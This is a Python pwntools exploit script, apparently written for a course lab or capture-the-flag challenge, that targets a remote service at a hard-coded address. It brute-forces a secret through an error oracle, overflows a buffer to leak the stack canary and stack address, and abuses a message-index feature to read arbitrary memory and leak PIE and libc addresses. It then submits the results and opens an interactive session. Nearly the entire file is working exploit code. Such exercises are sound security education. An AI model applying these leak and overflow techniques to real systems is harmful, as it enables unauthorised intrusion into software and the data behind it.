from pwn import *
io = remote('140.114.77.172', 10002)
#io = process('leak')

def asksecret(data):
    io.recvuntil('>')
    io.sendline('1')
    io.recvuntil('Try: ')
    #raw_input('compare secret')
    io.send(data)

def lab(stack, secret, canary):
    io.recvuntil('>')
    io.sendline('5')
    io.recvuntil('>')
    #raw_input('check stack answer')
    io.sendline('1')
    print(io.recvuntil('Stack: '))
    io.send(stack)
    print(io.recvuntil('Secret: '))
    io.send(secret)
    print(io.recvuntil('Canary: '))
    io.sendline(canary)

def hw(stack, pie, libc, secret, canary):
    io.recvuntil('>')
    io.sendline('5')
    io.recvuntil('>')
    io.sendline('2')
    io.recvuntil('answer: ')
    #raw_input('check libc answer')
    io.send(stack + pie + libc + secret + canary)

def leakSecret():
    padding = b'a'*8
    i = 0
    while 1:
        io.recvuntil('>')
        io.sendline('1')
        io.recvuntil('Try: ')

        trychar = i
        payload = padding + bytes([trychar])
        io.send(payload)
        line = io.recvline()
        if(line == b'H:Somthing went wrong!\n'): 
            i = i+1
            if(i > 255):    break
        elif(line == b'H:NoNoNo\n'):
            padding = padding + bytes([trychar])
            if(len(padding) == 16): return padding
            i = 0

    print("fail!!")

def leakStack():
    io.recvuntil('>')
    io.sendline('2')

    io.recvuntil('[y/n]\n')
    io.sendline('y')
    payload = b'a'*0x208 + b'b'
    io.send(payload)
    res = io.recvuntil('Continue?[y/n]\n')
    print(res)
    stack = u64(res[-22:-16]+b'\x00\x00')
    canary = u64(b'\x00' + res[-29:-22])

    io.sendline('y')
    io.recvuntil('[y/n]\n')
    io.sendline('y')
    payload = b'a'*0x208 + b'\x00'
    io.send(payload)
    io.recvuntil('[y/n]\n')
    io.sendline('n')
    return stack, canary

def leakPtr(leakaddr):
    io.recvuntil('>')
    io.sendline('2')
    io.recvuntil('[y/n]\n')
    io.sendline('y')
    payload = b'a'*0x20 + p64(leakaddr) + b'b'*0x4
    io.send(payload)
    io.recvuntil('Continue?[y/n]\n')
    io.sendline('n')

    io.recvuntil('>')
    io.sendline('3')

    io.recvuntil('Message Index: ')
    io.sendline('0')
    io.recvuntil('>')
    io.sendline('1')
    io.recvuntil('Message: ')
    payload = b'a'*0x20
    io.send(payload)

    io.recvuntil('>')
    io.sendline('4')

    io.recvuntil('Message Index: ')
    io.sendline('1')
    res = io.recvuntil('############\n')
    print(res)
    return res[15:21]

#leak canary and stack
stack, canary = leakStack()
stack = stack - 0x70
stack = p64(stack)
canary = p64(canary)
print('Stack: ')
print(stack)

leakaddr = u64(stack) + 0x70 - 0x18
PIEaddr = leakPtr(leakaddr)
print('Leak raddr: ')
print(PIEaddr)
PIEaddr = u64(PIEaddr + b'\00\00')
PIEaddr = PIEaddr + 0x2447
PIEaddr = p64(PIEaddr)
print(PIEaddr)

leakaddr = u64(PIEaddr) - 0x88
system_addr = leakPtr(leakaddr)
system_addr = system_addr + b'\00\00'
print(system_addr)
#leak secret
secret = leakSecret()
secret = secret[8:]
io.recvuntil('>')
io.sendline('1')
io.recvuntil('Try: ')
io.send(secret)
print(io.recvline())

'''
#notice: be careful to put these two lines before you enter grill() like :
io.recvuntil('>') # enter grill
io.sendline('2')

grill('y', ' first message in grill')
#you can receive message of printf at here
io.recvuntil(']\n')
io.send('y')

grill('y', 'second message in grill')
io.recvuntil(']\n')
io.send('n') # leave grill
'''
#lab check
#lab(stack, secret, canary)
#io.recvuntil('Here you go!\n')
#flag1 = io.recvuntil('}')
#print(flag1)


#leak PIE

#leak libc


hw(stack, PIEaddr, system_addr, secret, canary)
io.interactive()


